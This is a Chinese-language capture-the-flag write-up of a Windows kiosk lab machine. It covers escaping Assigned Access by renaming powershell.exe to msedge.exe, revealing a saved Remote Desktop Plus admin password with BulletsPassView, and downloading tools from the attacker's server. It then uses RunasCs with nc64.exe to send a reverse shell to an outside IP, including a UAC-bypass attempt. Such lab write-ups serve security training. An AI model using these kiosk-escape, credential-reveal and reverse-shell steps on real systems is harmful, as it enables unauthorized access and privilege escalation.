## VulnEscape

```
[★]$ nmap -sV -sC 10.129.234.51
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-19 00:17 CST
Nmap scan report for 10.129.234.51
Host is up (0.011s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ESCAPE
|   NetBIOS_Domain_Name: ESCAPE
|   NetBIOS_Computer_Name: ESCAPE
|   DNS_Domain_Name: Escape
|   DNS_Computer_Name: Escape
|   Product_Version: 10.0.19041
|_  System_Time: 2025-12-19T06:17:36+00:00
|_ssl-date: 2025-12-19T06:17:41+00:00; -34s from scanner time.
| ssl-cert: Subject: commonName=Escape
| Not valid before: 2025-12-18T06:14:42
|_Not valid after:  2026-06-19T06:14:42
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -34s, deviation: 0s, median: -34s
```
#### 扫描显示端口3389打开，这是默认的Microsoft远程桌面端口。让我们试着使用xfreerdp实用程序通过RDP连接到远程机器。
#### 这题要在 Windows 环境下做！！！！(不困了）
```
[★]$ xfreerdp /v:10.129.234.51 /dynamic-resolution -sec-nla

这条linux命令相当于：
【1】在本机MacBook Pro 搜索OpenVPN Connect macOS 下载OpenVPN Connect.app 完成导入.ovpn文件

【2】打开Parallels Desktop的win11, Win + R：输入mstsc,连接远程桌面连接
在连接时，我们看到一条消息，说明我们可以使用用户名KioskUser0和没有密码。

【3】按键fn + command + X
可以输入cmd ，为了测试有反应
主要输入file:///C:// 回车 ，有个URL，继续输入file:///C://
```
#### Windows Assigned Access（Kiosk）逃逸模型
#### 我们指定了上面的用户名，我们还注意到机器语言被设置为韩语。后输入用户名，我们按回车键，就登录到远程机器上了。
### Foothold
#### 登录后，我们注意到背景提到釜山世博会，我们是在一个非常有限的环境欠没有任务栏或其他图标。这台机器可能是一台计算机，用于在其中一个信息亭举行会议。
#### 这是进一步确认的用户，称为Kiosk用户。紧迫的点击开始按钮，我们会看到默认的开始菜单弹出。
#### 菜单显示了一些已安装的应用程序，但是，我们很快注意到我们无法打开任何一个应用程序，可能由于用户帐户控制（UAC）。
#### 我们注意到，我们可以使用搜索功能，但仍然没有任何应用程序可以打开。后通过一些枚举，我们确定只允许运行Microsoft Edge。
#### 点击默认的Microsoft Edge提示后，我们可以看到默认的Edge页面。后使用关键字windows kiosk escape执行谷歌搜索，通过一些研究，我们遇到一些文章，其中包含一些绕过受限Windows环境的技术，例如
#### 就是我们现在看到的那个。其中一种绕过绕过了默认的file://方案在Edge上用于浏览文件系统。让我们输入file:///C://作为URL

#### 我们注意到一个名为_admin的文件夹，并为以后注意它。暂时，让我们导航到哪里PowerShell位于C:\Windows\System32\WindowsPowerShell\v1.0\。

#### 打开资源管理器后，我们注意到我们无法导航到系统上的其他文件夹，然而，我们看到powershell.exe确实被“下载”并放置在当前用户的下载文件夹中。我们还知道，唯一允许运行的应用程序是Microsoft Edge和可执行程序Edge被称为msedge.exe，所以让我们尝试将powershell.exe重命名为msedge.exe，看看是否可以绕过现有的限制。注意：Windows默认情况下省略文件后缀，因此只需将powershell重命名为msedge即可工作


### Privilege Escalation
#### 在这个文件夹中，我们看到了几个有趣的文件夹以及一个名为profiles.xml的文件。


#### XML文件显示此文件夹由Remote Desktop Plus使用，该应用程序提供围绕默认Windows RDP协议的额外功能。该文件还保存了一个加密的密码。我们可以在C:\Program Files （x86）中找到这个应用程序。让我们运行一下。


#### 应用程序似乎没有任何现有的配置，但是有一个Manage Profiles按钮。让我们点击它。

#### 似乎没有加载任何配置文件，但我们可以单击Import和Export，然后单击Import配置文件来尝试加载我们之前找到的配置文件。

#### 我们很快就记起，我们无法访问文件系统的其余部分，因此我们必须先进行复制将包含概要文件的_admin文件夹放到Downloads文件夹中。让我们使用现有的PowerShell窗口。
```
PS C:\Users\kioskUser0\Downloads> cd 'C:\Program Files (x86)\Remote Desktop Plus'  
PS C:\Program Files (x86)\Remote Desktop Plus> copy -r C:\_admin\ C:\Users\kioskUser0\Downloads\
PS C:\Program Files (x86)\Remote Desktop Plus> dir
  Directory: C:\Program Files (x86)\Remote Desktop Plus
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/13/2018  10:47 PM         267264 rdp.exe
PS C:\Program Files (x86)\Remote Desktop Plus> ./rdp.exe
```
#### 复制完文件夹后，让我们从Remote Desktop Plus加载profiles.xml

#### 成功导入配置文件。
#### 如果我们单击Edit按钮，我们可以看到这个配置文件名为admin，并持有远程密码连接，可能是我们之前看到的加密密码

#### 我们无法看到实际的密码，因为它在应用程序窗口中被替换为*，但是，有一个一个叫做BulletsPassView的程序，我们可以用它来暴露隐藏在后面的密码Windows中的星星。让我们从本地下载这个应用程序，并使用PowerShell从远程机器
https://www.nirsoft.net/utils/bullets_password_view.html
```
MacBook-Pro Downloads % unzip bulletspassview-x64.zip 
Archive:  bulletspassview-x64.zip
  inflating: BulletsPassView.exe     
  inflating: BulletsPassView.chm     
  inflating: readme.txt            
MacBook-Pro Downloads % python3 -m http.server 8000
Serving HTTP on :: port 8000 (http://[::]:8000/) ...

```
#### 在远程机器的C:\目录下创建一个名为temp的文件夹后，让我们在本地启动一个Python web服务器，在我们下载BulletsPassView的同一个文件夹中。
```
PS C:\Program Files (x86)\Remote Desktop Plus> cd ../..
PS C:\> mkdir temp
Directory: C:\
Mode                 LastWriteTime         Length Name
d-----        12/22/2025   1:32 AM                temp
PS C:\> cd temp
PS C:\temp> wget http://10.10.14.190:8002/BulletsPassView.exe -O BPV.exe
PS C:\temp> ls
Directory: C:\temp
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/22/2025   1:37 AM          71776 BPV.exe
PS C:\temp> ./BPV.exe
```
#### 程序显示隐藏密码为Twisting3021。注意：为了正确显示密码，远程桌面Plus需要在编辑中前面展示的配置文件页面。我们可以推测这个密码属于名为admin的用户。

```
使用BulletsPassView.exe的事项：
1.得到portect.xml


注：
Secure=False 的真实含义
在 Remote Desktop Plus 里：
Secure=True → DPAPI（用户 + 机器绑定）
Secure=False → 程序内置密钥对称加密
密钥是写死在程序里的
```


```
PS C:\Users\kioskUser0> cd ..
PS C:\Users> net user admin
User name                    admin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
Password last set            2/3/2024 2:45:01 AM
Password expires             Never
Password changeable          2/3/2024 2:45:01 AM
Password required            No
User may change password     Yes
Workstations allowed         All
User profile
Home directory
Last logon                   4/10/2025 10:26:42 PM
Logon hours allowed          All
Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```
#### 我们很快发现这个用户是Administrators组的成员。让我们尝试登录到使用此用户远程系统。为此，我们可以使用RunasCs。在本地下载，然后上传到远程系统通过现有的Python web服务器。
https://github.com/antonioCoco/RunasCs
```
-MacBook-Pro Downloads % curl -O https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/RunasCs.cs

MacBook-Pro Downloads % python3 -m http.server 8026
Serving HTTP on :: port 8026 (http://[::]:8026/) ...
```
```
PS C:\temp> wget http://10.10.17.121:8026/RunasCs.cs -O RunasCs.cs
```
#### 我们也可以使用Windows版本的Netcat来将一个反向shell发送回我们的机器。让我们把这个也上传。
https://github.com/vinsworldcom/NetCat64/releases
```
PS C:\temp> wget http://10.10.17.121:8026/nc64.exe -O nc64.exe
```
#### 需要现场编译RunasCs.cs为RunasCs.exe
```
PS C:\> where csc
PS C:\> ls C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe //csc常见的位置
Directory: C:\Windows\Microsoft.NET\Framework\v4.0.30319
Mode                 LastWriteTime         Length Name
-a----         3/11/2024   9:00 PM        2154992 csc.exe
PS C:\> cd temp
PS C:\temp> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /out:RunasCs.exe RunasCs.cs
Microsoft (R) Visual C# Compiler version 4.8.9232.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.
This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

```
PS C:\temp> .\RunasCs.exe admin Twisting3021 "C:\temp\nc64.exe 10.10.17.121 1234 -e cmd.exe"
[*] Warning: The logon for user 'admin' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
```
```
PS C:\temp> .\RunasCs.exe admin Twisting3021 --bypass-uac --logon-type 8  "C:\temp\nc64.exe 10.10.17.121 1235 -e cmd.exe"
invalid port e: NO_DATA
```
